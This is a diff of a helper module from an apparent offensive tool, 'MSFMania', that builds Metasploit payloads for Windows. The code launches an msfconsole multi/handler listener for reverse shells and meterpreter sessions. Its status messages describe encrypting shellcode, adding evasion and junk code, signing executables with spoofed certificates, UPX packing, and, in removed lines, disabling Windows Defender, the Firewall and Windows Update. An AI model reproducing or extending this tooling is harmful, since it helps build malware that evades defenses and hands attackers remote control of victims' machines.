@@ -3,142 +3,140 @@ from random import randint, SystemRandom
 from os import system
 
 
-class MmColors:
-    blue = '\033[94m'
-    green = '\033[92m'
-    ocra = '\033[93m'
-    red = '\033[91m'
-    endc = '\033[0m'
-    bold = '\033[1m'
-    underline = '\033[4m'
-    darkcyan = '\033[36m'
+blue = '\033[94m'
+green = '\033[92m'
+ocra = '\033[93m'
+red = '\033[91m'
+endc = '\033[0m'
+bold = '\033[1m'
+underline = '\033[4m'
+darkcyan = '\033[36m'
+
+
+def varname_creator():
+    varname = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(8, 12)))
+    return varname
+
+
+def mscript(payload, lhost, lport):
+    lhost = lhost.replace("lhost=", "")
+    lport = lport.replace("lport=", "")
+    if "meterpreter" in payload:
+        system(f'msfconsole -x "use exploits/multi/handler; set lhost {lhost }; set lport {lport}; set payload {payload}; set AutoLoadStdapi false; set AutoSystemInfo false; set AutoVerifySession false; exploit -j -z" ')
+
+    elif "shell" in payload:
+        system(f'msfconsole -x "use exploits/multi/handler; set lhost {lhost }; set lport {lport}; set payload {payload}; exploit -j -z"')
 
 
 def banner():
     # Univers ASCII banner
-    print(MmColors.bold + """                                                                                            
+    print(bold + """                                                                                            
                 ███╗   ███╗███████╗███████╗███╗   ███╗ █████╗ ███╗   ██╗██╗ █████╗ 
                 ████╗ ████║██╔════╝██╔════╝████╗ ████║██╔══██╗████╗  ██║██║██╔══██╗
                 ██╔████╔██║███████╗█████╗  ██╔████╔██║███████║██╔██╗ ██║██║███████║
                 ██║╚██╔╝██║╚════██║██╔══╝  ██║╚██╔╝██║██╔══██║██║╚██╗██║██║██╔══██║
                 ██║ ╚═╝ ██║███████║██║     ██║ ╚═╝ ██║██║  ██║██║ ╚████║██║██║  ██║
                 ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝                                                                                                                                                                                                                   
-            Version : 2.3   -   Author : Killian CASAROTTO   -  Updated : June 28, 2020           
-    """ + MmColors.endc)
+             Version : 2.4   -   Author : Killian CASAROTTO   -  Updated : dev version           
+    """ + endc)
 
 
 def not_installed(package):
-    print(MmColors.red + MmColors.bold + "[x] >>> '" + package + "' is not installed." + MmColors.endc)
+    print(f"{red + bold}[x] '" + package + f"' is not installed.{endc}\n")
 
 
 def error_payload_lhost():
-    print(MmColors.red + MmColors.bold + "[x] >>> The payload needs the '-lh' or '--lhost' argument.\n" + MmColors.endc + MmColors.bold + "Exiting..." + MmColors.endc)
+    print(f"{red + bold}[x] The payload needs the '-lh' or '--lhost' argument.\n{endc + bold}Exiting...{endc}\n")
     exit()
 
 
 def error_payload_lport():
-    print(MmColors.red + MmColors.bold + "[x] >>> The payload needs the '-lp' or '--lport' argument.\n" + MmColors.endc + MmColors.bold + "Exiting..." + MmColors.endc)
+    print(f"{red + bold}[x] The payload needs the '-lp' or '--lport' argument.\n{endc + bold}Exiting...{endc}\n")
+    exit()
+
+
+def error_copt_nomsf():
+    print(f"{red + bold}[x] You can't add msf command without adding msf shellcode.\n{endc + bold}Exiting...{endc}\n")
+    exit()
+
+
+def error_payload_required():
+    print(f"{red + bold}[x] Msf payload or custom payload is required.{endc + bold}\nExiting...{endc}\n")
     exit()
 
 
 def error_payload_injectiontype():
-    print(MmColors.red + MmColors.bold + "[x] >>> The payload needs the '-it' or '--injectiontype' argument.\n" + MmColors.endc + MmColors.bold + "Exiting..." + MmColors.endc)
+    print(f"{red + bold}[x] The payload needs the '-it' or '--injectiontype' argument.{endc + bold}\nExiting...{endc}\n")
     exit()
 
 
-def warning_injectionType():
-    print(MmColors.ocra + MmColors.bold + "[!] >>> 'Remote' injection only works with x64 architectures. " + MmColors.endc + MmColors.bold + "Changing the parameter to 'local'." + MmColors.endc)
+def error_injectiontype():
+    print(f"{red + bold}[x] 'Remote Thread Injection' or 'Remote Thread Hijack' requiere '-pn' argument.{endc}\n")
+    exit()
 
 
 def error_procname(processname):
-    print(MmColors.red + MmColors.bold + "[x] >>> The specified process name is incorrect '" + MmColors.endc + MmColors.bold + processname + "'.\n" + "Exiting..." + MmColors.endc)
+    print(f"{red + bold}[x] The specified process name is incorrect '{endc}{bold}{processname}'.\nExiting...{endc}\n")
     exit()
 
 
 def error_icon(icon):
-    print(MmColors.red + MmColors.bold + "[x] >>> The specified icon name is incorrect '" + MmColors.endc + MmColors.bold + icon + "'.\n" + "Exiting..." + MmColors.endc)
+    print(f"{red + bold}[x] The specified icon name is incorrect {endc + bold}'" + icon + "'.\nExiting...{endc}\n")
     exit()
 
 
 def error_icon_file(icon):
-    print(MmColors.red + MmColors.bold + "[x] >>> The specified icon filename does not exist '" + MmColors.endc + MmColors.bold + icon + "'.\n" + "Exiting..." + MmColors.endc)
+    print(f"{red + bold}[x] The specified icon filename does not exist {endc + bold}'" + icon + "'.\nExiting...{endc}\n")
     exit()
 
 
-def varname_creator():
-    varname = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(24, 160)))
-    return varname
-
-
 def shellcode_generated():
-    print(MmColors.green + MmColors.bold + "[+] >>> Shellcode generated." + MmColors.endc)
+    print(f"\n{bold}[+] Shellcode generated.{endc}\n")
 
 
 def shellcode_encrypted():
-    print(MmColors.green + MmColors.bold + "[+] >>> Shellcode encrypted." + MmColors.endc)
+    print(f"{bold}[+] Shellcode encrypted.{endc}\n")
 
 
-def decoy_added():
-    print(MmColors.green + MmColors.bold + "[+] >>> Decoy code added." + MmColors.endc)
+def sleep_added(seconds):
+    print(f"{bold}[+] {seconds} seconds delay before payloads execution.{endc}\n")
 
 
 def evasion_added():
-    print(MmColors.green + MmColors.bold + "[+] >>> Evasion code added." + MmColors.endc)
+    print(f"{bold}[+] Evasion code added.{endc}\n")
 
 
 def junkcode_added():
-    print(MmColors.green + MmColors.bold + "[+] >>> Junkcode added." + MmColors.endc)
-
-
-def junkfunc_added():
-    print(MmColors.green + MmColors.bold + "[+] >>> Junkfunc added." + MmColors.endc)
-
-
-def wd_added():
-    print(MmColors.green + MmColors.bold + "[+] >>> Disabling Windows Defender added." + MmColors.endc)
-
-
-def wl_added():
-    print(MmColors.green + MmColors.bold + "[+] >>> Disabling Windows Firewall added." + MmColors.endc)
-
-
-def wu_added():
-    print(MmColors.green + MmColors.bold + "[+] >>> Disabling Windows Update added." + MmColors.endc)
+    print(f"{bold}[+] Junkcode added.{endc}\n")
 
 
 def compilation_completed():
-    print(MmColors.green + MmColors.bold + "[+] >>> File compiled and stripped." + MmColors.endc)
+    print(f"{bold}[+] File compiled and stripped.{endc}\n")
 
 
-def bad_certificate():
-    print(MmColors.red + MmColors.bold + "[x] >>> There is an error in the specified certificate. The executable file has not been signed." + MmColors.endc)
+def pe_signed(certificate):
+    print(f"{bold}[+] PE file signed with spoofed certificate from {certificate}{endc}\n")
 
 
-def exe_signed():
-    print(MmColors.green + MmColors.bold + "[+] >>> Exe file signed." + MmColors.endc)
+def bad_certificate(ex):
+    print(f"{red + bold}[x] There is an error in the specified certificate. The executable file has not been signed.\n{ex}{endc}\n")
 
 
 def file_size(fs):
-    print(MmColors.bold + f"[o] >>> Exe file size : {fs} bytes." + MmColors.endc)
+    print(f"{bold}[+] Final PE size: {fs} bytes.\n{endc}")
+
+
+def packed_file_changes(fs0, fs1):
+    print(f"{bold}[+] Final PE file size: {fs0} ==> {fs1} bytes.{endc}\n")
+
+
+def pe_packed():
+    print(f"{bold}[+] PE file packed with UPX.\n{endc}")
 
 
 def rar_compressed():
-    print(MmColors.green + MmColors.bold + "[+] >>> Exe file compressed to RAR file." + MmColors.endc)
+    print(f"{bold}[+] PE file compressed to RAR file.{endc}\n")
 
 
-def mscript(architecture, types, payload, lhost, lport):
-    lhost = lhost.replace("lhost=", "")
-    lport = lport.replace("lport=", "")
-    if architecture == "x64":
-        if types == "yes":
-            system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; set AutoLoadStdapi false; set AutoSystemInfo false; set AutoVerifySession false; exploit -j -z"')
-
-        elif types == "no":
-            system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; exploit -j -z"')
-
-    elif architecture == "x86":
-        if types == "yes":
-            system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; set AutoLoadStdapi false; set AutoSystemInfo false; set AutoVerifySession false; exploit -j -z"')
-
-        elif types == "no":
-            system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; exploit -j -z"')
+def file_hash(hash_type, hash_code):
+    print(f"{bold}[+] {hash_type} hash: {hash_code}{endc}\n")
